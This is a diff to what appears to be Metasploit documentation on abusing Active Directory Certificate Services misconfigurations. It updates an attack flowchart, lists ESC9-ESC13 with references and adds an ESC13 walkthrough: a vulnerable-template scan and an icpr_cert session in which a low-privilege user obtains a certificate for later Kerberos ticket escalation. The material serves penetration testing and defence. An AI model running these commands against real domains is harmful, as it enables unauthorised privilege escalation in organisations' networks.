@@ -5,18 +5,39 @@ for testing purposes.
 # Introduction to AD CS Vulnerabilities
 ```mermaid
 flowchart TD
-	escexp[Find vulnerable certificate templates\nvia ldap_esc_vulnerable_cert_finder] --> icpr[Issue certificates via icpr_cert]
-	icpr[Issue certificates via icpr_cert] --> ESC1{{ESC1}}
-	ESC1{{ESC1}} -- Via PKINIT --> pkinit{Authenticate to Kerberos}
-	icpr[Issue certificates via icpr_cert] --> users[Request certificates on behalf of other users]
-	users[Request certificates on behalf of other users] --> ESC2{{ESC2}}
-	users[Request certificates on behalf of other users] --> ESC3{{ESC3}}
-	ESC2{{ESC2}} -- Via PKINIT --> pkinit[Authenticate to Kerberos]
-	ESC3{{ESC3}} -- Via PKINIT --> pkinit[Authenticate to Kerberos]
-	ad_cs_template[Reconfigure certificates via ad_cs_cert_template] -- Exploit configuration --> icpr
+    subgraph ad_cs_cert_templates[<b>ad_cs_cert_templates</b>]
+        ESC4(ESC4)
+        update_template[<i>Update Template</i>]
+        ESC4 --> update_template
+    end
+    subgraph icpr_cert[<b>icpr_cert</b>]
+        ESC1(ESC1)
+        ESC2(ESC2)
+        ESC3(ESC3)
+        ESC13(ESC13)
+        alt_subject[<i>Alternate Subject Issuance</i>]
+        as_eagent[<i>Enrollment Agent Issuance</i>]
+        normal[<i>Normal Issuance</i>]
+
+        ESC1 --> alt_subject
+        ESC2 --> as_eagent
+        ESC3 --> as_eagent
+        ESC13 --> normal
+        as_eagent -- use new certificate --> normal
+    end
+    subgraph kerberos/get_ticket[<b>kerberos/get_ticket</b>]
+        PKINIT[<i>PKINIT</i>]
+    end
+    subgraph ldap_esc_vulnerable_cert_finder[<b>ldap_ecs_vulnerable_cert_finder</b>]
+        find_vulnerable_templates[<i>Find Vulnerable Templates</i>]
+    end
+    alt_subject --> PKINIT
+    find_vulnerable_templates --> icpr_cert
+    normal --> PKINIT
+    update_template --> ESC1
 ```
 
-The chart above showcases how one can go about attacking four common AD CS
+The chart above showcases how one can go about attacking five unique AD CS
 vulnerabilities, taking advantage of various flaws in how certificate templates are
 configured on an Active Directory Certificate Server.
 
@@ -30,8 +51,7 @@ administrator via Kerberos.
 Each certificate template vulnerability that will be discussed here has a ESC code, such
 as ESC1, ESC2. These ESC codes are taken from the original whitepaper that
 SpecterOps published which popularized these certificate template attacks, known as
-[Certified
-Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).
+[Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).
 In this paper Will Schroeder and Lee Christensen described 8 different domain escalation
 attacks that they found they could conduct via misconfigured certificate templates:
 
@@ -52,29 +72,30 @@ attacks that they found they could conduct via misconfigured certificate templat
 - ESC7 - Vulnerable Certificate Authority Access Control
 - ESC8 - NTLM Relay to AD CS HTTP Endpoints
 
-Later, another
-[blog](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
-came out from Oliver Lyak which discovered ESC9 and ESC10, two more vulnerabilities that
-could allow normal domain joined users to abuse certificate template misconfigurations to
-gain domain administrator privileges.
+Later, additional techniques were disclosed by security researchers:
 
-- ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in
-  `msPKI-EnrollmentFlag`. Also `StrongCertificateBindingEnforcement` not set to 2 or
-  `CertificateMappingMethods` contains `UPN` flag.
-- ESC10 - Weak Certificate Mappings -
-  `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
-  CertificateMappingMethods` contains `UPN` bit aka `0x4` or
-  `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement` is set to `0`.
+- ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in `msPKI-EnrollmentFlag`. Also
+  `StrongCertificateBindingEnforcement` not set to 2 or `CertificateMappingMethods` contains `UPN` flag.
+  - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
+    more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+- ESC10 - Weak Certificate Mappings - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
+  CertificateMappingMethods` contains `UPN` bit aka `0x4` or `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
+  StrongCertificateBindingEnforcement` is set to `0`.
+  - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
+    more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+- ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of
+  the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
+  - [Relaying to AD Certificate Services over
+    RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
+- ESC12 - A user with shell access to a CA server using a YubiHSM2 hardware security module can access the CA's private
+  key.
+  - [Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
+- ESC13 - Domain escalation via issuance policies with group links.
+  - [ADCS ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc13]]
 
-Finally, we have ESC11, which was discovered by Compass Security and described in their
-[blog
-post](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
-
-- ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC
-  interface is allowed due to lack of the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
-
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, and ESC4. As such,
-this page only covers exploiting ESC1 to ESC4 at this time.
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4 and ESC13. As such,
+this page only covers exploiting ESC1 through ESC4 and ESC13 at this time.
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -134,7 +155,9 @@ Domain Controller (DC), and will run a set of LDAP queries to gather a list of c
 templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out
 which users or groups can use that certificate template to elevate their privileges.
 
-At this time, the module is capable of identifying techniques ESC1 through ESC3.
+Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, and ESC13. The
+module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by
+analyzing the objects in LDAP.
 
 Keep in mind though that there are two sets of permissions in play here though. There is one set of permissions on the CA server that control
 who is able to enroll in any certificate template from that server, and second set of permissions that control who is allowed to enroll in
@@ -857,6 +880,67 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
 
 At this point the certificate template's configuration has been restored and the operator has a certificate that can be
 used to authenticate to Active Directory as the Domain Admin.
+
+# Exploiting ESC13
+To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active
+Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn't necessarily guaranteed to yield
+administrative privileges, rather the privileges that are gained are those of the group which is linked to by OID in the
+certificate template's issuance policy. The `auxiliary/gather/ldap_esc_vulnerable_cert_finder` module is capable of
+identifying certificates that meet the necessary criteria. When one is found, the module will include the group whose
+permissions will be included in the resulting Kerberos ticket in the notes section. In the following example, the
+ESC13-Test template is vulenerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
+
+```
+msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+...
+[*] Template: ESC13-Test
+[*]    Distinguished Name: CN=ESC13-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=collalabs1,DC=local
+[*]    Vulnerable to: ESC13
+[*]    Notes: ESC13 groups: ESC13-Group
+[*]    Certificate Template Enrollment SIDs:
+[*]       * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
+[*]       * S-1-5-21-3474343397-3755413101-2031708755-513 (Domain Users)
+[*]       * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
+[*]    Issuing CAs:
+[*]       * collalabs1-SRV-ADDS01-CA
+[*]          Server: SRV-ADDS01.collalabs1.local
+[*]          Enrollment SIDs:
+[*]             * S-1-5-11 (Authenticated Users)
+[*]             * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
+[*]             * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
+```
+
+In this case, the ticket can be issued with the `icpr_cert` module. No additional options are required to issue the
+certificate beyond the standard `CA`, `CERT_TEMPLATE`, target and authentication options.
+
+```
+msf6 > use auxiliary/admin/dcerpc/icpr_cert 
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
+CERT_TEMPLATE => ESC13-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate Email: normaluser@collalabs1.local
+[*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3474343397-3755413101-2031708755-10051
+[*] 172.30.239.85:445 - Certificate UPN: normaluser@collalabs1.local
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20240226170310_default_172.30.239.85_windows.ad.cs_917878.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) with the `ESC13-Group`
+RID present in the Groups field of the TGT PAC.
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
